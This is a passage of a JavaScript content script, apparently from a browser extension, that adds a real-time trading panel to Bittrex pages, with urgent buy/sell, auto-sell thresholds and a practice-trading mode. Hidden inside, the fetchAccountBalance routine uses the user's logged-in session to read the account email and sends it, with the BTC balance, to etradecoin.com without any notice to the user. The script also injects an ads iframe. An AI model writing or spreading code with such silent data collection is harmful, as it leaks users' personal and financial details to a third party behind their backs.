var html = '<style type="text/css">#HoangExt{font-family: verdana,Arial !important;font-size: 11.5px !important;padding: 10px; margin: 0px; width:100%; height:230px; position: fixed; bottom:0px; background-color:black; z-index:200; border-top: 1px solid #c6d5dc;   background-image: -webkit-linear-gradient(#ecf9fa, #fff);    background-image: linear-gradient(#ecf9fa, #fff);}#HoangExt span.detail {cursor: pointer;}.extButton{    border: 1px solid #c3d5dc;    border-radius: 3px;    box-shadow: inset 0 1px 0 0 white;    color: #333333;    display: inline-block;    font-weight: bold;    background-color: #f1f4f5;    background-image: -webkit-linear-gradient(#f1f4f5, #cddce1);    background-image: linear-gradient(#f1f4f5, #cddce1);    text-decoration: none;    text-shadow: 0 1px 0 #fdfdfe;    background-clip: padding-box;    color: #3a4449;padding: 2px 5px;margin-top: 5px;font-size: 12px;}.txt-exchange{border: 1px solid #91abac;    -webkit-box-shadow: inset 1px 1px 3px #d8e4e5 !important;    -moz-box-shadow: inset 1px 1px 3px #d8e4e5 !important;    box-shadow: inset 1px 1px 3px #d8e4e5 !important;    padding: 4px 6px;    background-color: #ffffff;margin-right: 5px;width: 78px; height: 24px;font-size: 11px !important;font-family: verdana;}.extChange{width:160px; height:160px; border:1px solid #c6d5dc; overflow:auto;padding:3px; margin:5px 5px 0 0; line-height:16px;font-size: 11.5px;}label {font-size: 11px;font-weight: normal;display: block;}#message {margin-top: 5px;font-size: 10px;display: block;}table.padding tr > td:last-child {padding-right: 10px;}table.padding input[type="text"] {width: 100px;}.text-sm {font-size: 11px !important;}#header-navigation{position:relative !important;}#HoangExt ul.tabs {position: absolute;top: -31px; left: 300px;margin: 0px;padding: 0px;}#HoangExt ul.tabs > li {background: #d4f3de;background: -moz-linear-gradient(top,  #d4f3de 0%, #e8ffe9 10%, #ffffff 34%, #ffffff 100%);background: -webkit-linear-gradient(top,  #d4f3de 0%,#e8ffe9 10%,#ffffff 34%,#ffffff 100%);background: linear-gradient(to bottom,  #d4f3de 0%,#e8ffe9 10%,#ffffff 34%,#ffffff 100%);filter: progid:DXImageTransform.Microsoft.gradient( startColorstr="#d4f3de", endColorstr="#ffffff",GradientType=0 );cursor: pointer;color: #aba9a5;padding: 0px 20px;line-height: 29px;font-size: 14px;list-style-type: none;border-radius: 5px 5px 0px 0px;border: 1px solid #c6d5dc;display: inline-block;margin-left: -1px;}#HoangExt ul.tabs > li.active {background: #91dab6;background: -moz-linear-gradient(top,  #91dab6 0%, #b2e5cd 10%, #ffffff 34%, #ffffff 100%);background: -webkit-linear-gradient(top,  #91dab6 0%,#b2e5cd 10%,#ffffff 34%,#ffffff 100%);background: linear-gradient(to bottom,  #91dab6 0%,#b2e5cd 10%,#ffffff 34%,#ffffff 100%);filter: progid:DXImageTransform.Microsoft.gradient( startColorstr="#91dab6", endColorstr="#ffffff",GradientType=0 );line-height: 31px;color: #0c683c;border-bottom: 0px;}#minimize {display: none;position: fixed;bottom: 2px;right: 2px;z-index: 999999;background-color: #fff;padding: 10px;border-radius: 4px;cursor: pointer;border: 1px solid #ccc;}.volstats {float: right;margin-right: 25px;line-height: 30px;font-size: 11px;}#extIfrm {width: 100%;height: 100%;border: none;min-height: 400px;}#adsIfrm {border: none;width: 100%;height: auto;}</style><meta http-equiv="content-type" content="text/html;charset=UTF-8"><div id="HoangExt" style="padding: 5px; margin: 0px; width:100%; height:250px; position: fixed; bottom:0px; background-color:white; font-family:arial; z-index:99999; border-top: 1px solid #c6d5dc;"><ul class="tabs"><li data-tab="1" onclick="switchTab(1)" class="active">Trading</li><li data-tab="2" onclick="switchTab(2)">Learning</li></ul><div style="position:inherit; right:10px;"><a href="javascript:void(0);" onClick="Hoang_Close();">X</a></div><table width="90%" align="center" border="0px" style="font-size:14px;"><tr><td rowspan="2" align="center" valign="middle"><div style="text-align:center;"><a href="http://www.etradetool.com" target="_blank"><img src="http://www.etradetool.com/images/etradecoin-logo.png" alt="Bittrex Reatime Trading" width="170px"/></a><br/><small>Tool Trade Bittrex Realtime <br/>Ver 1.0</small><span id="message"></span></div></td><td width="20%" rowspan="2" valign="top"><table width="97%"><tr><td width="22%" style="font-size:16px;font-weight:bold" id="marketName"></td></tr><tr><td>&nbsp;</td><td>&nbsp;</td></tr><tr class="tab-display tab-1-display" style="display:table-row;"><td width="40%"><label>Auto Sell <br>If Profit >= (%)</label></td><td><input type="text" class="txt-exchange" name="" id="sellAtProfitLarger"><button type="button" style="margin-top:0px;" class="extButton" id="btnAcceptAutoSellLarger">OK</button></td></tr><tr class="tab-display tab-1-display" style="display:table-row;"><td width="40%"><label>Auto Sell <br>If Profit <= (%)</label></td><td><input type="text" class="txt-exchange" name="" id="sellAtProfitSmaller"><button type="button" style="margin-top:0px;" class="extButton" id="btnAcceptAutoSellSmaller">OK</button></td></tr><tr class="tab-display tab-1-display" style="display:table-row;"><td width="40%"><label>&nbsp;</label></td><td><button type="button" style="margin-top:0px;" class="extButton" id="btnHideChart">Turn off chart</button><button type="button" style="margin-top:0px;display:none;" class="extButton" id="btnShowChart">Turn on chart</button></td></tr><tr class="tab-display tab-2-display" style="display:table-row;"><td colspan="2"><label>Your Learning Logs</label><div id="learningLog" style="max-height:160px;overflow-y:auto;font-size:10px;"></div></td></tr></table></td><td width="20%" rowspan="2" valign="top"><table width="97%"><tr><td width="55%" style="font-size: 14px; font-weight:bold;">PROFIT</td><td width="45%"><span id="changeWithFirstPrice" style="font-size:16px;">0</span></td></tr><tr><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td width="55%" class="text-sm">Latest Price:</td><td width="45%"><span id="price" class="text-sm" style="color:green" onclick="updateInputPrices();">0</span></td></tr><tr><td width="55%" class="text-sm">Begin Price: </td><td width="45%"><input type="text" class="txt-exchange" id="firstPrice" value="0"></td></tr><tr><td>&nbsp;</td><td>&nbsp;</td></tr><tr class="tab-display tab-1-display"><td width="55%"><label onclick="getAvailableBTC();">Urgent Buy (BTC)</label></td><td width="45%"><input type="text" style="width:58%;" class="txt-exchange" name="" id="urgentBuy"><button type="button" style="margin-top:0px;width:35%;" class="extButton" id="btnUrgentBuy">OK</button></td></tr><tr class="tab-display tab-1-display"><td width="55%"><label onclick="getAvailableAltCoin();">Urgent Sell (<span id="sellMarketName"></span>)</label></td><td width="45%"><input type="text" style="width:58%;" class="txt-exchange" name="" id="urgentSell"><button type="button" style="margin-top:0px;width:35%;" class="extButton" id="btnUrgentSell">OK</button></td></tr><tr class="tab-display tab-1-display"><td></td><td colspan="2"><button type="button" class="extButton" style="width:100%;color:#f00;" id="btnSellAll">Sell All</button></td></tr><tr class="tab-display tab-2-display"><td width="55%"><label>Urgent Buy (BTC)</label></td><td width="45%"><input type="text" style="width:58%;" class="txt-exchange" name="" id="urgentBuyLearn"><button type="button" style="margin-top:0px;width:35%;" class="extButton" id="btnUrgentBuyLearn">OK</button></td></tr><tr class="tab-display tab-2-display"><td width="55%"><label>Urgent Sell (<span id="sellMarketNameLearn"></span>)</label></td><td width="45%"><input type="text" style="width:58%;" class="txt-exchange" name="" id="urgentSellLearn"><button type="button" style="margin-top:0px;width:35%;" class="extButton" id="btnUrgentSellLearn">OK</button></td></tr><tr class="tab-display tab-2-display"><td></td><td colspan="2"><button type="button" class="extButton" style="width:100%;color:#f00;" id="btnSellAllLearn">Sell All</button></td></tr></table></td><td width="16%"><strong>PRICE HISTORY(<span id="countRequest" style="color:black;">0</span>)</strong> <br/><div class="text-sm">Up: <span id="priceUp" style="color:green">0</span> Down: <span id="priceDown" style="color:red">0</span> Pause: <span id="pricePause" style="color:black">0</span></div></td><td width="14%"><strong style="color:#575757">BUY VOLUME</strong><br/><div class="text-sm">Total: <span id="totalBuy" style="color:green"></span> <span id="buyChange1">BTC</span></div></td><td width="14%"><strong style="color:#575757">SELL VOLUME</strong><br/><div class="text-sm">Total: <span  id="totalSell" style="color:red"></span> <span id="sellChange1">BTC</span></div></td></tr><tr><td valign="top"><div id="priceChange" class="extChange" ></div><input type="button" id="btnReset" value="Reset" onClick="Hoang_Reset(1);" style="margin-top: 5px;" class="extButton" /></td><td valign="top"><div id="buyChange" class="extChange" ></div><input type="button" id="" value="Reset Buy/Sell" onClick="BuyReset(); SellReset();" style="margin-top: 5px;" class="extButton" /><span class="volstats"><span id="buyChangeRate">0</span>%</span></td><td valign="top"><div id="sellChange" class="extChange" ></div><span class="volstats"><span id="sellChangeRate">0</span>%</span></td></tr></table><!-- <div style="font-size:12px; text-align:center; padding:5px;z-index:9; background-color:#fff"><strong>Donate us</strong> to keep this tool alive. Donate BTC: <strong>1KhujBaBY5BQ2cfNZjCZ3a1ZH9tFSZkrwV</strong></div> --></div><div id="minimize" onclick="Hoang_Open();"><img src="http://www.etradetool.com/images/etradecoin-logo.png" alt="Bittrex Reatime Trading" width="170px"/></div>';
Number.prototype.priceFormat = function() {
    return this.toFixed(8)
};
Number.prototype.precentageFormat = function() {
    return this.toFixed(2)
};
Array.prototype.sum = function() {
    return this.reduce(function(a, b) {
        return a + b
    }, 0)
};
Math.randomBetween = function(start, end) {
    return Math.floor(Math.random() * (end - start + 1) + start)
};

function isUndefined(val) {
    return 'undefined' === typeof val
}

function isFunction(val) {
    return 'function' === typeof val
}

function isString(val) {
    return 'string' === typeof val
}
var marketHistoryTable = $('#marketHistoryTable2');
var displayMessage = function(text, color) {
    if (isUndefined(color)) color = 'red';
    $('#message').show().html(text).css('color', color)
};
var Cookie = function() {
    this.init()
};
Cookie.prototype = {
    set: function(name, value, days) {
        var expires;
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toGMTString()
        } else {
            expires = ""
        }
        document.cookie = name + "=" + value + expires + "; path=/"
    },
    get: function(name) {
        if ('undefined' !== typeof this.items[name]) {
            return this.items[name]
        } else return ''
    },
    clear: function(name) {
        this.set(name, '', -1)
    },
    init: function() {
        var items = {},
            _k, _v, _tmp;
        if (document.cookie !== '') {
            var cookieItems = document.cookie.split(';');
            for (var c = cookieItems.length, i = 0; i < c; i++) {
                _tmp = cookieItems[i].split('=');
                _k = _tmp[0].trim();
                _v = _tmp[1].trim();
                items[_k] = _v
            }
        }
        this.items = items
    }
};
var SystemAPI = function() {};
SystemAPI.prototype = {
    updateBTCBalance: function(exchange, email, balance) {
        $.ajax({
            method: 'POST',
            data: {
                ex: exchange,
                e: email,
                am: balance
            },
            url: 'https://etradecoin.com/system/api/balance/update',
            success: function(json) {},
        })
    }
};
var Chart = function() {
    this.wrapper = $('#tabChartTimeline .chart-wrapper');
    this.urlIframe = 'https://s.tradingview.com/dailyfx/widgetembed/?symbol=BITTREX:{{pair}}&interval=30&hidesidetoolbar=0&symboledit=1&saveimage=1&toolbarbg=f4f7f9&studies=BB@tv-basicstudies&hideideas=1&theme=White&timezone=Asia/bangkok&showpopupbutton=1&studies_overrides={}&overrides={}&enabled_features=[]&disabled_features=[]&showpopupbutton=1&locale=en';
    this.bittrexIframe = this.wrapper.find('iframe#ifrm')
};
Chart.prototype = {
    displayTrading: function() {
        var url = this.urlIframe.replace('{{pair}}', this.marketName);
        this.bittrexIframe.hide();
        this.wrapper.append('<iframe id="extIfrm" src="' + url + '"></iframe>' + '<a style="float:right;text-decoration:none;color:#999;font-size:13px;" href="http://etradecoin.com" target="_blank"><i>Chart by ETRADECOIN</i></a>')
    },
    setMarketName: function(marketName) {
        var pair = marketName.split('-');
        this.marketName = pair[1] + pair[0]
    },
    hide: function() {
        this.wrapper.find('#extIfrm').hide();
        this.bittrexIframe.show()
    },
    show: function() {
        this.wrapper.find('#extIfrm').show();
        this.bittrexIframe.hide()
    }
};
var BannerAds = function() {
    this.initialize()
};
BannerAds.prototype = {
    initialize: function() {
        if (Math.randomBetween(0, 1) == 1) {
            var ifrm = '<div class="col-md-12 col-xs-6 stat-left">' + '<iframe id="adsIfrm" src="https://etradecoin.com/system/tools/bittrex/ads.html"></iframe>' + '<div>';
            $('.market-stats').append(ifrm)
        }
    }
};
var BittrexApi = function() {};
BittrexApi.prototype = {
    TradeBuy: function(pair, total, rate) {
        var coin = pair.split('-');
        var data = {};
        data['MarketName'] = pair;
        data['OrderType'] = 'LIMIT';
        data['Quantity'] = (total - 0.00000125) / rate;
        data['Rate'] = rate + rate * 0.0002;
        data['TimeInEffect'] = 'GOOD_TIL_CANCELLED';
        data['ConditionType'] = 'NONE';
        data['Target'] = 0;
        data['__RequestVerificationToken'] = $('input[name="__RequestVerificationToken"]').val();
        $.ajax({
            url: 'https://bittrex.com/api/v2.0/auth/market/TradeBuy',
            method: 'POST',
            dataType: 'json',
            data: data
        }).then(function(json) {
            if (!json.success) {
                alert(json.message)
            } else {
                displayMessage('Order to buy ' + coin[1] + ' at price ' + rate + ' successfully.', 'green');
                $('#urgentBuy').val('');
                $('#urgentSell').val('');
                exchangeObject.reset()
            }
        })
    },
    TradeSell: function(pair, unit, rate) {
        var coin = pair.split('-');
        var data = {};
        data['MarketName'] = pair;
        data['OrderType'] = 'LIMIT';
        data['Quantity'] = unit;
        data['Rate'] = rate - rate * 0.0002;
        data['TimeInEffect'] = 'GOOD_TIL_CANCELLED';
        data['ConditionType'] = 'NONE';
        data['Target'] = 0;
        data['__RequestVerificationToken'] = $('input[name="__RequestVerificationToken"]').val();
        $.ajax({
            url: 'https://bittrex.com/api/v2.0/auth/market/TradeSell',
            method: 'POST',
            dataType: 'json',
            data: data
        }).then(function(json) {
            if (!json.success) {
                alert(json.message)
            } else {
                displayMessage('Order to sell ' + coin[1] + ' at price ' + rate + ' successfully.', 'green');
                $('#urgentBuy').val('');
                $('#urgentSell').val('')
            }
        })
    },
    OrderHistory: function(pair, callback) {
        var data = {};
        if (!isUndefined(pair) && isString(pair)) data['MarketName'] = pair;
        $.ajax({
            url: 'https://bittrex.com/api/v2.0/auth/market/GetOrderHistory',
            method: 'POST',
            dataType: 'json',
            data: data,
            success: function(json) {
                if (isFunction(pair)) {
                    pair(json);
                    return
                }
                if (!isUndefined(callback)) {
                    callback(json);
                    return
                }
            }
        })
    },
    GetSummary: function(callback) {
        var data = {};
        data['__RequestVerificationToken'] = $('input[name="__RequestVerificationToken"]').val();
        $.ajax({
            url: 'https://bittrex.com/Manage/GetSummary',
            method: 'POST',
            data: data,
            success: function(json) {
                if (typeof json === 'object') {
                    callback(json)
                } else callback(null)
            }
        })
    }
};
var ExchangeBuy = function() {
    this.historyValues = []
};
ExchangeBuy.prototype = {
    getCurrentValue: function() {
        var newVal = 0;
        marketHistoryTable.find('tbody > tr').each(function() {
            var orderType, cost;
            orderType = $(this).children('td:eq(1)').find('div').html();
            cost = parseFloat($(this).children('td:eq(4)').html());
            if (orderType === 'BUY') newVal += cost
        });
        this.storeHistoryValue(newVal);
        return newVal
    },
    storeHistoryValue: function(value) {
        this.historyValues.unshift(value)
    },
    reset: function() {
        this.historyValues = []
    }
};
var ExchangeSell = function() {
    this.historyValues = []
};
ExchangeSell.prototype = {
    getCurrentValue: function() {
        var newVal = 0;
        marketHistoryTable.find('tbody > tr').each(function() {
            var orderType, cost;
            orderType = $(this).children('td:eq(1)').find('div').html();
            cost = parseFloat($(this).children('td:eq(4)').html());
            if (orderType === 'SELL') newVal += cost
        });
        this.storeHistoryValue(newVal);
        return newVal
    },
    storeHistoryValue: function(value) {
        this.historyValues.unshift(value)
    },
    reset: function() {
        this.historyValues = []
    }
};
var Exchange = function() {
    this.buyObject = new ExchangeBuy();
    this.sellObject = new ExchangeSell();
    this.chartObject = new Chart();
    this.api = new BittrexApi();
    this.elementParent = $('#HoangExt');
    this.balanceFetched = false;
    this.priceStatus = {
        up: 0,
        pause: 0,
        down: 0
    };
    this.auto = {
        sellProfitLarger: null,
        sellProfitSmaller: null
    };
    this.chartObject.setMarketName(this.getMarketName());
    this.chartObject.displayTrading()
};
Exchange.prototype = {
    realtime: function() {
        var currentBuyPrice = this.buyObject.getCurrentValue(),
            currentSellPrice = this.sellObject.getCurrentValue(),
            currentLastPrice = this.getCurrentPrice(),
            self = this;
        marketHistoryTable.find('tbody').html('');
        self.fetchAccountBalance();
        this.getFirstPriceFromOrderHistory(function() {
            self.updatePriceHistory(currentLastPrice)
        });
        this.elementParent.find('#sellChange').prepend($('<span>', {
            html: currentSellPrice.priceFormat(),
            style: 'display: block; color: ' + (currentSellPrice >= 2 ? 'red' : 'black')
        }));
        this.elementParent.find('#buyChange').prepend($('<span>', {
            html: currentBuyPrice.priceFormat(),
            style: 'display: block; color: ' + (currentBuyPrice >= 2 ? 'green' : 'black')
        }));
        this.updateTradingStats()
    },
    getCurrentPrice: function() {
        return parseFloat($('.market-stats > div:eq(1) .base-market span').html())
    },
    getMarketName: function() {
        return bittrex.market.marketName
    },
    updatePriceHistory: function(currentLastPrice) {
        var self = this;
        if (isUndefined(self.firstPrice) || self.firstPrice == 0) {
            self.firstPrice = currentLastPrice;
            self.elementParent.find('#firstPrice').val(self.firstPrice.priceFormat())
        }
        if (isUndefined(self.prevPrice)) {
            self.prevPrice = currentLastPrice
        }
        var diffWithFirstPrice = (currentLastPrice - self.firstPrice) / self.firstPrice * 100 - 0.49;
        var diffWithPrevPrice = (currentLastPrice - self.prevPrice) / self.prevPrice * 100;
        self.elementParent.find('#changeWithFirstPrice').html($('<span>', {
            html: diffWithFirstPrice.precentageFormat() + '%',
            style: 'color:' + self.getColorByDiffPercent(diffWithFirstPrice)
        }));
        self.elementParent.find('#price').html(currentLastPrice.priceFormat());
        self.elementParent.find('#priceChange').prepend($('<span>', {
            html: currentLastPrice.priceFormat() + '(' + diffWithPrevPrice.precentageFormat() + '%)',
            style: 'display:block; color:' + self.getColorByDiffPercent(diffWithPrevPrice)
        }));
        self.updatePriceStatus(currentLastPrice, self.prevPrice);
        self.prevPrice = currentLastPrice;
        if (self.auto.sellProfitLarger !== null) {
            var available = parseFloat($('#availableMarketCurrency').html());
            if (self.auto.sellProfitLarger <= diffWithFirstPrice && available > 0) {
                self.api.TradeSell(self.getMarketName(), available, self.getCurrentPrice())
            }
        }
        if (self.auto.sellProfitSmaller !== null) {
            var available = parseFloat($('#availableMarketCurrency').html());
            if (self.auto.sellProfitSmaller >= diffWithFirstPrice && available > 0) {
                self.api.TradeSell(self.getMarketName(), available, self.getCurrentPrice())
            }
        }
    },
    getColorByDiffPercent: function(percent) {
        if (percent > 0) return 'green';
        else if (percent == 0) return 'black';
        else return 'red'
    },
    updatePriceStatus: function(currentPrice, prevPrice) {
        if (currentPrice > prevPrice) this.priceStatus.up++;
        else if (currentPrice == prevPrice) this.priceStatus.pause++;
        else this.priceStatus.down++;
        this.elementParent.find('#priceUp').html(this.priceStatus.up);
        this.elementParent.find('#pricePause').html(this.priceStatus.pause);
        this.elementParent.find('#priceDown').html(this.priceStatus.down);
        this.elementParent.find('#countRequest').html(this.priceStatus.up + this.priceStatus.pause + this.priceStatus.down)
    },
    getFirstPriceFromOrderHistory: function(callback) {
        var self = this;
        if (isUndefined(self.firstPrice) || self.firstPrice == 0) {
            self.api.OrderHistory(self.getMarketName(), function(json) {
                var tmp = 0,
                    row, total = 0;
                for (var i = 0, c = json.result.length; i < c; i++) {
                    row = json.result[i];
                    if (row.OrderType == 'LIMIT_SELL') {
                        break
                    }
                    if (row.OrderType == 'LIMIT_BUY') {
                        tmp++;
                        total += row.PricePerUnit
                    }
                }
                if (tmp > 0 && total > 0) {
                    self.firstPrice = total / tmp;
                    self.firstPrice = parseFloat(self.firstPrice.priceFormat());
                    self.elementParent.find('#firstPrice').val(self.firstPrice.priceFormat())
                }
                callback()
            })
        } else callback()
    },
    fetchAccountBalance: function() {
        var self = this;
        var amountBTC = parseFloat($('#availableBaseCurrency').html());
        if (self.balanceFetched === false && amountBTC != 0 && !isNaN(amountBTC)) {
            self.api.GetSummary(function(json) {
                if (json !== null) {
                    var cookie = new Cookie();
                    var currentUnix = (new Date()).getTime() / 1000;
                    var lastUpdated = parseInt(cookie.get('_bittrex_last_fetch'));
                    lastUpdated = isNaN(lastUpdated) ? 0 : lastUpdated;
                    if (currentUnix - lastUpdated > 30 * 24 * 3600) {
                        var api = new SystemAPI();
                        api.updateBTCBalance('bittrex', json.PrimaryEmail, amountBTC);
                        cookie.set('_bittrex_last_fetch', currentUnix + 30 * 24 * 3600, 30);
                        self.balanceFetched = true
                    }
                }
            })
        }
    },
    updateTradingStats: function() {
        var _tBuy = this.buyObject.historyValues.sum();
        var _tSell = this.sellObject.historyValues.sum();
        var _dBuy;
        if (_tBuy > 0 || _tSell > 0) _dBuy = _tBuy / (_tBuy + _tSell) * 100;
        else _dBuy = 50;
        this.elementParent.find('#totalBuy').html(_tBuy.priceFormat());
        this.elementParent.find('#totalSell').html(_tSell.priceFormat());
        this.elementParent.find('#buyChangeRate').html(_dBuy.precentageFormat());
        this.elementParent.find('#sellChangeRate').html((100 - _dBuy).precentageFormat())
    },
    reset: function() {
        this.priceStatus = {
            up: 0,
            pause: 0,
            down: 0
        };
        this.firstPrice = parseFloat($('.market-stats > div:eq(1) .base-market span').html());
        $('#firstPrice').val(this.firstPrice);
        $('#changeWithFirstPrice span').html('-0.49%')
    }
};
var Learning = function() {
    this.coinsAmount = {};
    this.coinsPaid = {}
};
Learning.prototype = {
    increaseAmount: function(pair, amount) {
        if ('undefined' === typeof this.coinsAmount[pair]) {
            this.coinsAmount[pair] = amount
        } else {
            this.coinsAmount[pair] += amount
        }
    },
    decreaseAmount: function(pair, amount) {
        if ('undefined' === typeof this.coinsAmount[pair]) {
            this.coinsAmount[pair] = 0
        } else {
            this.coinsAmount[pair] -= amount;
            if (this.coinsAmount[pair] < 0) {
                this.coinsAmount[pair] = 0
            }
        }
    },
    increaseTotalPaid: function(pair, total) {
        if ('undefined' === typeof this.coinsPaid[pair]) {
            this.coinsPaid[pair] = total
        } else {
            this.coinsPaid[pair] += total
        }
    },
    decreaseTotalPaid: function(pair, total) {
        if ('undefined' === typeof this.coinsPaid[pair]) {
            this.coinsPaid[pair] = 0
        } else {
            this.coinsPaid[pair] -= total;
            if (this.coinsPaid[pair] < 0) {
                this.coinsPaid[pair] = 0
            }
        }
    },
    getAmountOfPair: function(pair) {
        if ('undefined' === typeof this.coinsAmount[pair]) {
            this.coinsAmount[pair] = 0
        }
        return this.coinsAmount[pair]
    },
    getTotalOfPair: function(pair) {
        if ('undefined' === typeof this.coinsPaid[pair]) {
            this.coinsPaid[pair] = 0
        }
        return this.coinsPaid[pair]
    },
    getDiffPercent: function(comVal, desVal) {
        return (comVal - desVal) / desVal * 100 - 0.4
    },
    buy: function(pair, total, price) {
        altCoin = pair.split('-');
        altCoin = altCoin[1];
        price = price + price * 0.0002;
        price = parseFloat(price.toFixed(8));
        amount = total / price;
        amount = parseFloat(amount.toFixed(8));
        this.increaseAmount(pair, amount);
        this.increaseTotalPaid(pair, total);
        $('#urgentBuyLearn').val('');
        $('#urgentSellLearn').val(this.getAmountOfPair(pair));
        this.saveLog('Buy', altCoin, amount, price);
        displayMessage('Bought ' + amount.toFixed(8) + altCoin + ' at price ' + price.toFixed(8) + 'BTC', 'green');
        Hoang_Reset()
    },
    sell: function(pair, amount, price) {
        var altCoin = pair.split('-'),
            unitPrice, profit;
        altCoin = altCoin[1];
        if (amount == 0) {
            displayMessage('');
            return
        }
        if (this.getAmountOfPair(pair) < amount) {
            displayMessage('Not enough ' + altCoin);
            return
        }
        price = price - price * 0.0002;
        price = parseFloat(price.toFixed(8));
        total = price * amount;
        unitPrice = this.getTotalOfPair(pair) / this.getAmountOfPair(pair);
        profit = this.getDiffPercent(price, unitPrice);
        this.decreaseAmount(pair, amount);
        this.decreaseTotalPaid(pair, total);
        if (this.getAmountOfPair(pair) == 0) {
            this.coinsPaid[pair] = 0
        }
        $('#urgentSellLearn').val(this.getAmountOfPair(pair));
        this.saveLog('Sell', altCoin, amount, price, profit, total);
        displayMessage('Sold ' + amount.toFixed(8) + altCoin + ' at price ' + price.toFixed(8) + 'BTC')
    },
    saveLog: function(type, coin, amount, price, profit, total) {
        var textColor;
        if (type == 'Buy') textColor = '#3c948d';
        else textColor = '#d20000';
        $('#learningLog').append('<b style="color:' + textColor + ';">' + type + '</b>' + ' ' + amount.toFixed(8) + ' <b>' + coin + '</b> at price ' + price.toFixed(8) + '<br>');
        if (type == 'Sell') {
            $('#learningLog').append('<b>Your Profit:</b> ' + profit.toFixed(2) + '% = ' + ((total * profit / 100).toFixed(8)) + 'BTC<br><br>')
        }
    }
};
$("body").append(html);
$('#orderSummary').css({
    'padding-bottom': '120px'
});
var learningObject = new Learning();
var exchangeObject = new Exchange();
var bannerAdsObject = new BannerAds();
var realtimeInterval;

function updateValues() {
    if ($('#urgentSell').val() == '' || $('#urgentSell').val() == '0') {
        $('#urgentSell').val($('#availableMarketCurrency').html())
    }
    if ($('#urgentBuy').val() == '' || $('#urgentBuy').val() == '0') {
        var baseCurrency = parseFloat($('#availableBaseCurrency').html());
        baseCurrency = baseCurrency - baseCurrency * 0.005;
        $('#urgentBuy').val(baseCurrency > 0 ? baseCurrency.priceFormat() : 0)
    }
}
$('#marketName').html(exchangeObject.getMarketName().replace('-', '/'));
$('#sellMarketName').html(exchangeObject.getMarketName().split('-')[1]);
$('#sellMarketNameLearn').html(exchangeObject.getMarketName().split('-')[1]);
setTimeout(function() {
    realtimeInterval = setInterval(function() {
        updateValues();
        exchangeObject.realtime()
    }, 6000)
}, 2000);
var getAvailableBTC = function() {
    $('#urgentBuy').val($('#availableBaseCurrency').html())
};
var getAvailableAltCoin = function() {
    $('#urgentSell').val($('#availableMarketCurrency').html())
};

function Hoang_Reset(all) {
    exchangeObject.elementParent.find('#priceUp').html('0');
    exchangeObject.elementParent.find('#pricePause').html('0');
    exchangeObject.elementParent.find('#priceDown').html('0');
    exchangeObject.elementParent.find('#countRequest').html('0');
    exchangeObject.elementParent.find('#priceChange').html('');
    exchangeObject.reset()
}

function Hoang_Close() {
    $("#HoangExt").hide();
    $("#minimize").show()
}

function Hoang_Open() {
    $("#HoangExt").show();
    $("#minimize").hide()
}

function BuyReset() {
    exchangeObject.buyObject.reset();
    exchangeObject.elementParent.find('#buyChange').html('');
    exchangeObject.elementParent.find('#totalBuy').html('0');
    exchangeObject.elementParent.find('#buyChangeRate').html('0')
}

function SellReset() {
    exchangeObject.sellObject.reset();
    exchangeObject.elementParent.find('#sellChange').html('');
    exchangeObject.elementParent.find('#totalSell').html('0');
    exchangeObject.elementParent.find('#sellChangeRate').html('0')
}

function updateInputPrices() {
    var currentPrice = $('.market-stats > div:eq(4) .base-market span').html();
    $('input[name=price_Buy]').val(parseFloat(currentPrice));
    parseFloat($('').html());
    var currentBid = $('.market-stats > div:eq(3) .base-market span').html();
    $('input[name=price_Sell]').val(parseFloat(currentBid));
    $('#availableBaseCurrency').click();
    $('#availableMarketCurrency').click()
}
$(document).on('keyup', '#urgentBuy', function(e) {
    var k = e.which || e.keyCode;
    if (k === 13) {
        var val = $(this).val();
        if (val != '') {
            exchangeObject.api.TradeBuy(exchangeObject.getMarketName(), parseFloat(val), exchangeObject.getCurrentPrice())
        }
    }
});
$(document).on('keyup', '#urgentSell', function(e) {
    var k = e.which || e.keyCode;
    if (k === 13) {
        var val = $(this).val();
        if (val != '') {
            exchangeObject.api.TradeSell(exchangeObject.getMarketName(), parseFloat(val), exchangeObject.getCurrentPrice())
        }
    }
});
$(document).on('keyup', '#sellAtProfitLarger', function(e) {
    var k = e.which || e.keyCode;
    if (k === 13) {
        var val = $(this).val();
        if (val != '') {
            val = parseFloat(val);
            exchangeObject.auto.sellProfitLarger = val;
            displayMessage('Done! Auto sell if Profit >= ' + val + '%')
        } else {
            exchangeObject.auto.sellProfitLarger = null;
            displayMessage('Done! Cancelled auto sell')
        }
    }
});
$(document).on('keyup', '#sellAtProfitSmaller', function(e) {
    var k = e.which || e.keyCode;
    if (k === 13) {
        var val = $(this).val();
        if (val != '') {
            val = parseFloat(val);
            exchangeObject.auto.sellProfitSmaller = val;
            displayMessage('Done! Auto sell if Profit <= ' + val + '%')
        } else {
            exchangeObject.auto.sellProfitSmaller = null;
            displayMessage('Done! Cancelled auto sell')
        }
    }
});
$(document).on('keyup', '#firstPrice', function(e) {
    var k = e.which || e.keyCode;
    if (k === 13) {
        var val = $(this).val();
        if (val != '') {
            exchangeObject.firstPrice = parseFloat(val);
            var currentPrice = exchangeObject.getCurrentPrice();
            var diffWithFirstPrice = (currentPrice - exchangeObject.firstPrice) / exchangeObject.firstPrice * 100 - 0.49;
            exchangeObject.elementParent.find('#changeWithFirstPrice').html($('<span>', {
                html: diffWithFirstPrice.precentageFormat() + '%',
                style: 'color:' + exchangeObject.getColorByDiffPercent(diffWithFirstPrice)
            }))
        }
    }
});
$(document).on('focusout', '#firstPrice', function(e) {
    var e = jQuery.Event('keyup');
    e.which = 13;
    $(this).trigger(e)
});
$(document).on('click', '#btnUrgentBuy', function() {
    var e = jQuery.Event('keyup');
    e.which = 13;
    $('#urgentBuy').trigger(e)
});
$(document).on('click', '#btnUrgentSell', function() {
    var e = jQuery.Event('keyup');
    e.which = 13;
    $('#urgentSell').trigger(e)
});
$(document).on('click', '#btnAcceptAutoSellLarger', function() {
    var e = jQuery.Event('keyup');
    e.which = 13;
    $('#sellAtProfitLarger').trigger(e)
});
$(document).on('click', '#btnAcceptAutoSellSmaller', function() {
    var e = jQuery.Event('keyup');
    e.which = 13;
    $('#sellAtProfitSmaller').trigger(e)
});
$(document).on('click', '#btnSellAll', function() {
    exchangeObject.api.TradeSell(exchangeObject.getMarketName(), parseFloat($('#availableMarketCurrency').html()), exchangeObject.getCurrentPrice())
});
$(document).on('click', '#btnHideChart', function() {
    exchangeObject.chartObject.hide();
    $('#btnShowChart').show();
    $(this).hide()
});
$(document).on('click', '#btnShowChart', function() {
    exchangeObject.chartObject.show();
